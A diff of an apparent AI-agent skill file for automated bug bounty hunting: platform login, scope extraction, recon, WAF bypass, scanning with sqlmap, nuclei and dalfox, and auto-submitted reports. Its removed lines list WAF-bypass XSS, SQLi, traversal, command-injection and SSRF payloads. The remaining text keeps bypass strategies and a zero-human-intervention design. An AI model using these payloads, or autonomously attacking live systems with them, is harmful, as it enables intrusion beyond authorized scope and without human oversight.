@@ -1,12 +1,6 @@
 ---
 name: bugbounty-automation
-description: |
-  Fully automated bug bounty pipeline. Logs into HackerOne, Bugcrowd, and OpenBugBounty via
-  browser (prompted for sign-in), selects a program, extracts scope, runs multi-phase recon and
-  vulnerability scanning at 1 RPS, detects WAF and applies bypass payloads, captures screenshot
-  evidence for every confirmed finding, writes a structured report, and broadcasts real-time
-  alerts + the final report to ALL configured channels (Discord, Telegram, WhatsApp, iMessage,
-  Signal, etc.). Zero manual intervention after launch.
+description: "Fully automated bug bounty pipeline that logs into HackerOne, Bugcrowd, or OpenBugBounty via browser, selects a program, extracts scope, runs multi-phase recon and vulnerability scanning at 1 RPS, detects WAF and applies bypass strategies, captures screenshot evidence for confirmed findings, writes a structured report, and broadcasts alerts to all configured channels. Use when the operator wants to run an end-to-end bug bounty hunt with zero manual intervention after launch."
 metadata:
   {
     "openclaw":
@@ -60,572 +54,303 @@ metadata:
 
 # Bug Bounty Automation — Zero-Touch Hunter
 
-End-to-end automated bug bounty pipeline: program selection → recon → scanning → WAF bypass →
-evidence capture → report → all-channel broadcast.
+End-to-end automated bug bounty pipeline: program selection, recon, scanning, WAF bypass, evidence capture, report generation, and all-channel broadcast.
 
 > [!IMPORTANT]
-> Only test targets within the program's defined scope. Every test is rate-limited to **1 RPS** by
-> default to stay within platform rules and avoid bans. Never exceed authorized scope.
-
----
+> Only test targets within the program's defined scope. Every test is rate-limited to **1 RPS** by default. Never exceed authorized scope.
 
 ## Pipeline Overview
 
-```
-┌─────────────────────────────────────────────────────────┐
-│  PHASE 0  │  Browser Login (HackerOne/Bugcrowd/OBB)     │
-├─────────────────────────────────────────────────────────┤
-│  PHASE 1  │  Program Selection & Scope Extraction        │
-├─────────────────────────────────────────────────────────┤
-│  PHASE 2  │  Recon  (subdomains, live hosts, tech-fp)    │
-├─────────────────────────────────────────────────────────┤
-│  PHASE 3  │  WAF Detection + Bypass Payload Selection    │
-├─────────────────────────────────────────────────────────┤
-│  PHASE 4  │  Vuln Scan @ 1 RPS (nuclei, sqlmap, ffuf…)  │
-├─────────────────────────────────────────────────────────┤
-│  PHASE 5  │  Confirmation + Screenshot Evidence          │
-├─────────────────────────────────────────────────────────┤
-│  PHASE 6  │  Report Generation                           │
-├─────────────────────────────────────────────────────────┤
-│  PHASE 7  │  Broadcast All Channels                      │
-└─────────────────────────────────────────────────────────┘
-```
+| Phase | Description |
+|-------|-------------|
+| 0 | Browser Login (HackerOne / Bugcrowd / OpenBugBounty) |
+| 1 | Program Selection and Scope Extraction |
+| 2 | Recon (subdomains, live hosts, tech fingerprinting) |
+| 3 | WAF Detection and Bypass Strategy Selection |
+| 4 | Vulnerability Scanning at 1 RPS |
+| 5 | Confirmation and Screenshot Evidence |
+| 6 | Report Generation |
+| 7 | Broadcast to All Channels |
 
----
-
-## Usage from Agent
+## Usage
 
 ```
 Run the bug bounty automation pipeline on HackerOne — pick the best program and find all bugs
 Start a bug bounty hunt on Bugcrowd, rate-limit to 1 RPS, notify all channels on every finding
-Automate a full bug bounty run on OpenBugBounty and send me the report when done
 Hunt bugs on HackerOne program example.com with WAF bypass payloads enabled
 ```
 
----
-
 ## Phase 0 — Browser Login
 
-The agent opens the bug bounty platform in the browser and prompts you to sign in.
-After login, the session is reused for all API and scope calls.
+The agent opens the platform in the browser, prompts sign-in, then reuses the session for all subsequent API and scope calls.
 
-### HackerOne
+### Validation Checkpoint
 
-```
-[Agent → Browser]
-1. Navigate to https://hackerone.com/users/sign_in
-2. Prompt user: "Please sign in to HackerOne in the browser window."
-3. Wait for redirect to dashboard (URL contains /dashboard or /reports)
-4. Save session cookies for API calls
-```
-
-### Bugcrowd
-
-```
-[Agent → Browser]
-1. Navigate to https://bugcrowd.com/user/sign_in
-2. Prompt user: "Please sign in to Bugcrowd in the browser window."
-3. Wait for redirect to /dashboard
-4. Save session for scope API calls
-```
-
-### OpenBugBounty
-
-```
-[Agent → Browser]
-1. Navigate to https://www.openbugbounty.org/login/
-2. Prompt user: "Please sign in to OpenBugBounty in the browser window."
-3. Wait for post-login redirect
-4. Save session
-```
-
----
-
-## Phase 1 — Program Selection & Scope Extraction
-
-After login the agent automatically selects the most suitable program:
-
-### Selection Criteria (in priority order)
-
-| Criterion           | Preference                                       |
-| ------------------- | ------------------------------------------------ |
-| Bounty availability | Programs with bounties (not VDP-only)            |
-| Scope breadth       | Wildcard `*.domain.com` > single domain          |
-| Recency             | Programs updated recently (active)               |
-| Report velocity     | Lower competition = higher chance of unique bugs |
-| Payout range        | Highest max critical bounty                      |
-
-### HackerOne Program Selection
-
-```python
-# Fetch open programs with bounties, sorted by max payout
-GET https://hackerone.com/programs.json?
-  &product_type=bug-bounty
-  &ordering=Highest+bounty
-  &open_to_public=true
-
-# Extract scope from chosen program
-GET https://hackerone.com/{program-slug}/policy_scopes.json
-# scope types: URL, WILDCARD, ANDROID_PACKAGE_NAME, etc.
-# Only test scope_type IN_SCOPE, skip OUT_OF_SCOPE
-```
-
-### Bugcrowd Program Selection
-
-```python
-GET https://bugcrowd.com/programs.json?
-  &reward_type=bounty
-  &sort=promoted
-
-# Extract targets from brief
-GET https://bugcrowd.com/{program}/brief.json
-# targets[].target — enumerate all in-scope
-```
-
-### OpenBugBounty Program Selection
-
-```python
-# Browse via scraping (no official API)
-GET https://www.openbugbounty.org/bugbounty/
-# Filter: latest added programs, select by domain count / reward info
-```
-
----
-
-## Phase 2 — Recon @ 1 RPS
-
-All active recon tools are rate-limited to **1 request per second** per target host.
-
-### 2a — Subdomain Enumeration (Passive First)
+Before proceeding, verify all required tools are installed:
 
 ```bash
-# Passive only first (no direct contact with target)
+for tool in nuclei subfinder httpx ffuf sqlmap wafw00f nmap curl python3; do
+  command -v "$tool" >/dev/null || echo "MISSING: $tool — install before continuing"
+done
+```
+
+### Login Steps
+
+1. Navigate to the platform login page:
+   - HackerOne: `https://hackerone.com/users/sign_in`
+   - Bugcrowd: `https://bugcrowd.com/user/sign_in`
+   - OpenBugBounty: `https://www.openbugbounty.org/login/`
+2. Prompt user: "Please sign in to [platform] in the browser window."
+3. Wait for redirect to dashboard or post-login page.
+4. Save session cookies for API calls.
+
+## Phase 1 — Program Selection and Scope Extraction
+
+### Selection Criteria (priority order)
+
+| Criterion | Preference |
+|-----------|------------|
+| Bounty availability | Programs with bounties (not VDP-only) |
+| Scope breadth | Wildcard `*.domain.com` preferred over single domain |
+| Recency | Recently updated programs (active) |
+| Report velocity | Lower competition for unique bugs |
+| Payout range | Highest max critical bounty |
+
+### Program API Endpoints
+
+```bash
+# HackerOne — fetch open bounty programs sorted by payout
+GET https://hackerone.com/programs.json?product_type=bug-bounty&ordering=Highest+bounty&open_to_public=true
+# Extract scope: GET https://hackerone.com/{program-slug}/policy_scopes.json
+# Only test scope_type=IN_SCOPE; skip OUT_OF_SCOPE entries
+
+# Bugcrowd — fetch bounty programs
+GET https://bugcrowd.com/programs.json?reward_type=bounty&sort=promoted
+# Extract targets: GET https://bugcrowd.com/{program}/brief.json
+
+# OpenBugBounty — scrape (no official API)
+GET https://www.openbugbounty.org/bugbounty/
+```
+
+### Scope Validation Checkpoint
+
+After extracting scope, confirm each target domain resolves and is explicitly listed as IN_SCOPE before any active testing. Log the validated scope list for audit trail.
+
+## Phase 2 — Recon at 1 RPS
+
+All active recon tools are rate-limited to 1 request per second per target host.
+
+### Subdomain Enumeration (passive first)
+
+```bash
+# Passive — no direct contact with target
 subfinder -d TARGET -o recon/subs.txt -silent -all
 
-# Certificate transparency (no target contact)
+# Certificate transparency
 curl -s "https://crt.sh/?q=%.TARGET&output=json" \
   | python3 -c "import json,sys;[print(r['name_value']) for r in json.load(sys.stdin)]" \
   | sort -u >> recon/subs.txt
 
-# Deduplicate
 sort -u recon/subs.txt -o recon/subs_all.txt
-echo "[*] $(wc -l < recon/subs_all.txt) unique subdomains"
 ```
 
-### 2b — Live Host Probing @ 1 RPS
+### Live Host Probing
 
 ```bash
-# httpx with rate limit — 1 RPS per host
 httpx -l recon/subs_all.txt \
   -rate-limit 1 \
   -tech-detect -title -status-code \
   -o recon/live.txt --json -o recon/live.json
 ```
 
-### 2c — Technology Fingerprinting
+### Technology Fingerprinting
 
 ```bash
-# Whatweb for verbose tech fingerprint
 whatweb --log-json=recon/tech.json \
   --wait=1 --max-threads=1 \
   $(cat recon/live.txt | tr '\n' ' ')
 ```
 
----
+## Phase 3 — WAF Detection and Bypass
 
-## Phase 3 — WAF Detection & Bypass
-
-### 3a — Detect WAF
+### Detect WAF
 
 ```bash
 wafw00f https://TARGET -o recon/waf.txt -f json
 ```
 
-WAF detection looks for:
+Detects Cloudflare, Akamai, AWS WAF, Imperva, F5, Sucuri, ModSecurity, Barracuda, and others.
 
-- Cloudflare, Akamai, AWS WAF, Imperva, F5, Sucuri, ModSecurity, Barracuda
+### Bypass Strategies
 
-### 3b — WAF Bypass Payload Sets
+If a WAF is detected, apply these bypass strategies to all payloads across vulnerability classes:
 
-If a WAF is detected, these bypass techniques are applied to **all payloads**:
+| Strategy | Technique | Example |
+|----------|-----------|---------|
+| Encoding | HTML entity, URL, double-URL, base64 encoding of payload keywords | `&#97;&#108;&#101;&#114;&#116;` for `alert` |
+| Case mutation | Mixed-case keywords to evade case-sensitive rules | `SeLeCt`, `ScRiPt` |
+| Comment obfuscation | Inline comments breaking keyword signatures | `SE/**/LECT`, `scr<!---->ipt` |
+| Whitespace alternatives | Tabs, newlines, extra spaces instead of standard whitespace | `SELECT%09*%09FROM` |
+| Protocol tricks | Alternative protocols, IP encoding for SSRF | Decimal IP `2130706433`, hex `0x7f000001`, IPv6 `[::1]` |
+| Wildcard/expansion | Shell brace expansion and variable substitution | `{cat,/etc/passwd}`, `${IFS}` |
 
-#### XSS Bypass (WAF-aware)
+The agent generates context-specific bypass payloads at runtime based on the detected WAF product. Claude already knows the full payload sets — the strategy table above guides selection.
 
-```
-<!-- Encoding bypasses -->
-<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
-<script>eval(atob('YWxlcnQoMSk='))</script>
-<svg/onload=\u0061\u006C\u0065\u0072\u0074(1)>
-<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">
+### sqlmap WAF Bypass Tampers
 
-<!-- Case / space mutation -->
-<ScRiPt>alert(1)</sCrIpT>
-<SCRIPT SRC=//xss.rocks/xss.js></SCRIPT>
-<img   src=x   onerror  =  alert(1)>
-
-<!-- Protocol bypass -->
-<a href="jAvAsCrIpT:alert(1)">click</a>
-<a href="data:text/html,<script>alert(1)</script>">x</a>
-
-<!-- Comment obfuscation -->
-<scr<!---->ipt>alert(1)</scr<!---->ipt>
-```
-
-#### SQLi Bypass (WAF-aware)
-
-```sql
--- Case variation
-SeLeCt * FrOm users WhErE id='1'
-
--- Inline comment injection
-SE/**/LECT * FR/**/OM users
-
--- URL encoding
-%53%45%4C%45%43%54 * FROM users
-
--- Double URL encoding
-%2553%2545%254C%2545%2543%2554
-
--- Scientific notation (MySQL)
-SELECT 1e0 UNION SELECT 1e0 FROM users
-
--- Whitespace alternatives (tab, newline)
-SELECT%09*%09FROM%09users
-
--- MySQL-specific
-SELECT/*!50000 * */FROM users
-```
-
-#### Path Traversal Bypass (WAF-aware)
+When WAF is detected, add tamper chain to sqlmap:
 
 ```
-..%2F..%2F..%2Fetc%2Fpasswd
-..%252F..%252Fetc%252Fpasswd
-....//....//etc/passwd
-%2e%2e%2f%2e%2e%2fetc%2fpasswd
-..\/..\/etc\/passwd
-/..%00/..%00/etc/passwd
+--tamper=space2comment,charencode,randomcase,between,equaltolike
 ```
 
-#### Command Injection Bypass (WAF-aware)
+## Phase 4 — Vulnerability Scanning at 1 RPS
 
-```bash
-# IFS separator
-${IFS}id
+All scans use `--rate-limit 1` or equivalent. Tools run sequentially per target with 1-second inter-request delay.
 
-# Brace expansion
-{cat,/etc/passwd}
-
-# Variable substitution
-$'i\144'
-
-# Wildcard
-/???/??d
-
-# Base64 pipe
-echo "aWQ=" | base64 -d | sh
-```
-
-#### SSRF Bypass (WAF-aware)
-
-```
-# IP encoding
-http://2130706433/          # 127.0.0.1 as decimal
-http://0x7f000001/          # 127.0.0.1 as hex
-http://127.000.000.001/     # padded octets
-http://[::1]/               # IPv6 loopback
-http://localhost.localstack.cloud/  # DNS rebind
-
-# AWS IMDS bypass
-http://169.254.169.254/latest/meta-data/
-http://[fd00:ec2::254]/latest/meta-data/
-http://169.254.169.254@target.com/
-```
-
----
-
-## Phase 4 — Vulnerability Scanning @ 1 RPS
-
-All scans use `--rate-limit 1` or equivalent. Tools are run **sequentially** per target
-with a 1-second inter-request delay.
-
-### 4a — Nuclei (CVE + Misconfiguration Scan)
+### Nuclei (CVE and Misconfiguration)
 
 ```bash
 nuclei -l recon/live.txt \
   -severity critical,high,medium \
-  -rate-limit 1 \
-  -bulk-size 1 \
-  -concurrency 1 \
-  -stats \
-  -json -o findings/nuclei.json \
+  -rate-limit 1 -bulk-size 1 -concurrency 1 \
+  -stats -json -o findings/nuclei.json \
   -markdown-export findings/nuclei_report/
 ```
 
-### 4b — SQL Injection (sqlmap)
+### SQL Injection (sqlmap)
 
 ```bash
-# Per endpoint, with WAF bypass if detected
 sqlmap -l recon/requests.txt \
-  --batch \
-  --level=3 --risk=2 \
-  --delay=1 \
-  --timeout=30 \
+  --batch --level=3 --risk=2 \
+  --delay=1 --timeout=30 \
   --technique=BEUST \
   --tamper=space2comment,charencode,randomcase \
-  --dbs \
-  --json-output=findings/sqli.json
-
-# WAF bypass tamper chain
-# --tamper=between,charencode,space2comment,randomcase,equaltolike
+  --dbs --json-output=findings/sqli.json
 ```
 
-### 4c — XSS (ffuf + dalfox)
+### XSS (ffuf + dalfox)
 
 ```bash
-# ffuf parameter fuzzing @ 1 RPS
 ffuf -u "https://TARGET/FUZZ" \
   -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-  -rate 1 \
-  -mc 200,301,302 \
-  -o findings/params.json
+  -rate 1 -mc 200,301,302 -o findings/params.json
 
-# dalfox XSS scan (with WAF bypass payloads)
 dalfox url "https://TARGET" \
-  --delay 1000 \
-  --waf-bypass \
-  --format json \
-  -o findings/xss.json
+  --delay 1000 --waf-bypass \
+  --format json -o findings/xss.json
 ```
 
-### 4d — SSRF Detection
+### SSRF Detection
 
-```bash
-python3 - << 'EOF'
-import requests, time, json
+Test common SSRF-prone parameters (`url`, `redirect`, `next`, `target`, `dest`, `uri`, `link`, `src`, `path`) against callback and internal targets. Use 1-second delay between requests. Check responses for indicators like `root:`, `ami-id`, or `instance-id`.
 
-target = "TARGET"
-callback = "https://YOURCOLLABORATOR.burpcollaborator.net"
-ssrf_payloads = [
-    f"http://127.0.0.1/",
-    f"http://169.254.169.254/latest/meta-data/",
-    f"http://[::1]/",
-    f"{callback}/ssrf-test",
-    f"http://0x7f000001/",
-]
-params_to_test = ["url", "redirect", "next", "target", "dest", "uri", "link", "src", "path"]
-
-for param in params_to_test:
-    for payload in ssrf_payloads:
-        try:
-            r = requests.get(f"https://{target}/", params={param: payload}, timeout=10)
-            if any(x in r.text for x in ["root:", "ami-id", "instance-id"]):
-                print(json.dumps({"type": "SSRF", "param": param, "payload": payload, "status": r.status_code}))
-        except:
-            pass
-        time.sleep(1)  # 1 RPS
-EOF
-```
-
-### 4e — Path Traversal
+### Path Traversal
 
 ```bash
 ffuf -u "https://TARGET/FUZZ" \
   -w findings/traversal_payloads.txt \
-  -rate 1 \
-  -mr "root:x|\\[boot loader\\]" \
+  -rate 1 -mr "root:x|\\[boot loader\\]" \
   -o findings/traversal.json
 ```
 
-### 4f — Open Redirect
+### Open Redirect
 
 ```bash
 ffuf -u "https://TARGET/?redirect=FUZZ" \
   -w /usr/share/seclists/Fuzzing/redirect-urls.txt \
-  -rate 1 \
-  -mr "Location: https://evil.com" \
+  -rate 1 -mr "Location: https://evil.com" \
   -o findings/redirects.json
 ```
 
-### 4g — Subdomain Takeover
+### Subdomain Takeover
 
 ```bash
 nuclei -l recon/subs_all.txt \
-  -t takeovers/ \
-  -rate-limit 1 \
+  -t takeovers/ -rate-limit 1 \
   -json -o findings/takeovers.json
 ```
 
----
+## Phase 5 — Confirmation and Screenshot Evidence
 
-## Phase 5 — Confirmation & Screenshot Evidence
+Every finding is confirmed before reporting:
 
-Every potential finding is confirmed and captured:
-
-### Confirmation Flow
-
-```
-1. Detect anomaly (nuclei/ffuf/sqlmap output)
-       ↓
-2. Send PoC payload manually via exec/requests — confirm deterministic response
-       ↓
-3. Open in browser → take screenshot
-       ↓
-4. Save: evidence/CLAW-YYYY-NNN_[type]_[host]_screenshot.png
-       ↓
-5. Annotate screenshot: highlight the finding in the page
-```
-
-### Screenshot Capture
-
-```python
-# Browser screenshot of confirmed finding
-browser.navigate("https://TARGET/vulnerable-endpoint?payload=CONFIRMED_PAYLOAD")
-browser.screenshot("/evidence/FINDING_ID_screenshot.png")
-```
+1. Replay the PoC payload via direct request to confirm deterministic response.
+2. Open the endpoint in browser with the confirmed payload.
+3. Capture screenshot: `evidence/CLAW-YYYY-NNN_[type]_[host]_screenshot.png`
+4. Annotate the screenshot highlighting the finding.
 
 ### Evidence Package per Finding
 
 ```
-evidence/
-  CLAW-2026-001/
-    request.txt          ← raw HTTP request
-    response.txt         ← raw HTTP response
-    screenshot.png       ← browser screenshot
-    poc_command.sh       ← reproducible PoC
-    nuclei_output.json   ← raw tool output
+evidence/CLAW-2026-001/
+  request.txt          # raw HTTP request
+  response.txt         # raw HTTP response
+  screenshot.png       # browser screenshot
+  poc_command.sh       # reproducible PoC
+  nuclei_output.json   # raw tool output (if applicable)
 ```
-
----
 
 ## Phase 6 — Report Generation
 
 ### Finding Format
 
-````markdown
-## CLAW-2026-001 — [SQL Injection in /api/search]
+Each finding follows this structure:
 
-| Field            | Value                                               |
-| ---------------- | --------------------------------------------------- |
-| **Severity**     | CRITICAL                                            |
-| **CVSS**         | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)           |
-| **CWE**          | CWE-89                                              |
-| **OWASP**        | A03:2021 Injection                                  |
-| **ATT&CK**       | T1190                                               |
-| **Host**         | api.example.com                                     |
-| **Endpoint**     | /api/search?q=                                      |
+```markdown
+## CLAW-2026-001 — [Vulnerability Type in /endpoint]
+
+| Field | Value |
+|-------|-------|
+| **Severity** | CRITICAL |
+| **CVSS** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
+| **CWE** | CWE-89 |
+| **Host** | api.example.com |
+| **Endpoint** | /api/search?q= |
 | **WAF Bypassed** | Yes (Cloudflare — tamper: space2comment,charencode) |
 
 ### Description
-
-SQL injection in the `q` parameter allows an unauthenticated attacker to dump the entire database.
+[Concise description of the vulnerability and its impact]
 
 ### Reproduction (PoC)
-
-```bash
-sqlmap -u "https://api.example.com/api/search?q=1" --dbs --batch --delay=1
-```
-````
+[Exact command to reproduce]
 
 ### Evidence
-
-![Screenshot](evidence/CLAW-2026-001/screenshot.png)
-
-**Extracted data:**
-
-```
-Database: app_db
-Tables: users, payments, sessions
-[*] users: 15,423 rows
-```
+[Screenshot and extracted data]
 
 ### Business Impact
-
-Full database exfiltration. All user credentials, PII, and payment records exposed.
+[Impact statement]
 
 ### Remediation
+[Fix recommendation]
+```
 
-Use parameterized queries. Do not concatenate user input into SQL strings.
+### HackerOne API Submission
 
-````
-
-### Auto-Submit to Platform
-
-```python
-# HackerOne API submission
-POST https://api.hackerone.com/v1/hackers/reports
-{
-  "data": {
-    "type": "report",
-    "attributes": {
-      "team_handle": "PROGRAM_HANDLE",
-      "title": "SQL Injection in /api/search — Full DB Exfil",
-      "vulnerability_information": "...",
-      "severity_rating": "critical",
-      "impact": "...",
-      "weakness_id": 89
-    }
-  }
-}
-# Attach screenshots as assets
-````
-
----
+Submit confirmed findings via the HackerOne Reports API (`POST /v1/hackers/reports`) with `team_handle`, `title`, `vulnerability_information`, `severity_rating`, `impact`, and `weakness_id`. Attach screenshots as report assets.
 
 ## Phase 7 — All-Channel Broadcast
 
-### Real-Time Finding Alert (per finding found)
+### Real-Time Finding Alert
+
+For each confirmed finding, broadcast to all configured channels (Discord, Telegram, WhatsApp, iMessage, Signal, etc.):
 
 ```
-🐛 BUG FOUND — CLAW-2026-001
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+BUG FOUND — CLAW-2026-001
 Platform:   HackerOne / example.com
 Type:       SQL Injection
-Severity:   🔴 CRITICAL (CVSS 9.8)
+Severity:   CRITICAL (CVSS 9.8)
 Endpoint:   /api/search?q=
-WAF:        Cloudflare ✅ (bypassed)
+WAF:        Cloudflare (bypassed)
 Evidence:   [screenshot attached]
-
-Report submitted to HackerOne ✅
+Status:     Report submitted
 ```
 
-Broadcast channels:
+### Final Run Summary
 
-- Discord (+ screenshot embed)
-- Telegram (+ screenshot)
-- WhatsApp
-- iMessage
-- Signal
-- Any other configured channel
-
-### Final Report Broadcast (end of run)
-
-```
-📋 BUG BOUNTY RUN COMPLETE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Platform:      HackerOne
-Program:       example.com
-Duration:      3h 42m
-Targets:       47 live hosts scanned
-Rate:          1 RPS throughout
-
-Findings:
-  🔴 CRITICAL: 1  (CLAW-2026-001 — SQLi)
-  🟠 HIGH:     3  (XSS, SSRF, Open Redirect)
-  🟡 MEDIUM:   8
-  🔵 LOW:      5
-
-WAF detected:  Cloudflare → bypassed ✅
-Reports filed: 4 submitted to HackerOne
-
-Full report + evidence: /reports/2026-02-23_example.com.md
-```
-
----
+At the end of the run, broadcast a summary with total findings by severity, WAF status, number of reports filed, duration, and link to the full report file.
 
 ## Config
-
-Set HackerOne API credentials for auto-submission:
 
 ```json5
 {
@@ -639,33 +364,19 @@ Set HackerOne API credentials for auto-submission:
 }
 ```
 
-## Rate Limiting Config
+## Rate Limiting
 
-All tools default to **1 RPS**. Override per-run:
-
-```
-Run bug bounty on HackerOne at 0.5 RPS (extra cautious)
-Run bug bounty on Bugcrowd at 2 RPS (if program allows)
-```
+All tools default to **1 RPS**. Override per-run if the program explicitly permits higher rates. Never exceed program-specified rate limits.
 
 > [!CAUTION]
-> Never exceed program-specified rate limits. Getting banned = losing future earnings.
-> Default 1 RPS is safe for all platforms. Never set above 5 RPS without explicit program permission.
+> Getting banned means losing future earnings. Default 1 RPS is safe for all platforms. Never set above 5 RPS without explicit program permission.
 
 ## Safety Rules
 
 1. **Scope check before every request** — verify the target is IN_SCOPE before testing
 2. **No destructive tests** — no account deletion, no data destruction, no DoS payloads
 3. **No PII access beyond proof** — stop at confirmation, do not bulk-exfiltrate
-4. **Rate limit: 1 RPS default** — always
+4. **Rate limit: 1 RPS default** — always enforced
 5. **Report before disclosing** — submit to platform before sharing externally
-
-## Usage from Agent
-
-```
-Start a full automated bug bounty hunt on HackerOne — best available program
-Run bug bounty automation on Bugcrowd with WAF bypass enabled, notify all channels
-Hunt on OpenBugBounty and submit any findings automatically
-Run bug bounty on HackerOne program shopify, 1 RPS, send me alerts on Discord when you find something
-Give me a summary of the last bug bounty run results
-```
+6. **Validate tool availability** — confirm all required binaries are installed before starting
+7. **Log all actions** — maintain audit trail of every request sent to target
